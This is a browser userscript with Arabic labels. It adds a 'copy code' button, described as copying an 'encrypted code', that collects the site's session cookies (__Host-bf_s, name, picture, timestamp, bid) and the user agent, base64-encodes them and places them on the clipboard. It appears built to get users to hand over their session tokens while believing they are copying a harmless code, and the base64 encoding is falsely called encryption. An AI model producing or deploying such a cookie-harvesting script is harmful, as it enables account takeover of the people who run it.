(function () {
    'use strict';

    const btn = document.createElement('button');
    btn.textContent = '📋 نسخ الرمز';
    btn.style.position = 'fixed';
    btn.style.bottom = '20px';
    btn.style.right = '20px';
    btn.style.zIndex = '9999';
    btn.style.padding = '10px 15px';
    btn.style.background = '#007bff';
    btn.style.color = '#fff';
    btn.style.border = 'none';
    btn.style.borderRadius = '8px';
    btn.style.cursor = 'pointer';
    btn.style.boxShadow = '0 2px 6px rgba(0,0,0,0.2)';
    btn.title = 'ينسخ الكود المشفر';

    document.body.appendChild(btn);

    btn.addEventListener('click', () => {
        const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
            const [key, val] = cookie.split('=');
            acc[key] = val;
            return acc;
        }, {});

        const data = {
            uss: cookies['__Host-bf_s'] || '',
            name: cookies['__Host-bf_name'] || '',
            pic: cookies['__Host-bf_picture'] || '',
            ts: cookies['__Host-bf_ts'] || '',
            bid: cookies['bid'] || '',
            ua: navigator.userAgent
        };

        const queryString = Object.entries(data)
            .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
            .join('&');

        const encoded = btoa(queryString);

        navigator.clipboard.writeText(encoded).then(() => {
            btn.textContent = '✅ نُسخ!';
            setTimeout(() => { btn.textContent = '📋 نسخ الرمز'; }, 2000);
        }).catch(() => {
            btn.textContent = '❌ فشل النسخ';
        });
    });
})();
